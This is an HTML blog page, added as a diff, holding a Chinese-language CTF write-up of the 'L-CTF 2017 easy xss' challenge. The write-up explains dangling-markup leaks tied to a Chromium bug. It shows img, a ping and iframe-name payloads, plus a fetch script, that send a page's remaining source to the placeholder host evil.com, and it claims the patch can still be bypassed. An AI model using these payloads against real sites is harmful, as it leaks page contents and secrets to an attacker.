@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en">
+    <head>
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content="Browser Security">
+        <link rel="shortcut icon" href="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg"/>
+        <link rel="alternate" type="application/rss+xml" title="math1as" href="/atom.xml">
+        <title>L-CTF 2017 easy xss | math1as&#39; blog</title>
+        <meta name="description" content="{{meta_description}}">
+
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <meta name="HandheldFriendly" content="True" />
+        <meta name="MobileOptimized" content="320" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg" alt="math1as' blog" /></a>
+            <h1><a href="/">math1as</a></h1>
+            <p>Security Researcher</p>
+            <div id="follow-icons">
+              <a href="http://twitter.com/Ma7h1as"><i class="fa fa-twitter-square fa-2x"></i></a>
+          <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </div>
+<h6><a href="/About">About</a></h6>
+<h6><a href="/friendlink">Friendlink</a></h6
+<h6><a href="/papers">Papers</a></h6>
+<h6><a href="/Credit">Credit</a></h6>
+<h6><a href="/Bounty">Bounty</a></h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  December 15, 2017
+  
+
+  <h1 class="post-title">L-CTF 2017 easy xss</h1>
+  <section class="post-content article-entry">
+    <p>L-CTF 2017 easy xss</p>
+<p>本题目存在两种解法,已经在官方wp中予以阐述</p>
+<p>着重说一下针对html解释器的攻击部分。</p>
+<p>来源于 <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=680970" target="_blank" rel="external">https://bugs.chromium.org/p/chromium/issues/detail?id=680970</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p>
+<p>使用标签的src属性,吃掉后面的源码,并泄露出去。</p>
+<p>为了降低难度,使用的chrome版本里是具有这个漏洞的</p>
+<p>但其实最新版本仍然可以绕过patch加以利用,有两种方式的POC</p>
+<p>需要交互的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a ping=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p>
+<p>由于需要交互,比较鸡肋,实践中用不上。</p>
+<p>并不需要交互的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&apos;//evil.com/evil.html&apos; name=&apos;</div></pre></td></tr></table></figure>
+<p>在evil.html中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">fetch(&apos;//evil.com/?p=&apos;+escape(name))</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>即可获取泄露的内容</p>
+
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>math1as</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <span class="page-number">•</span>
+    
+    <a class="older-posts" href="/2017/10/30/freenote/">
+        <!--0ctf 2015 freenote--> next →
+    </a>
+    
+</nav>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2017 math1as.</section>
+       </footer>
+    </body>
+</html>
+
+
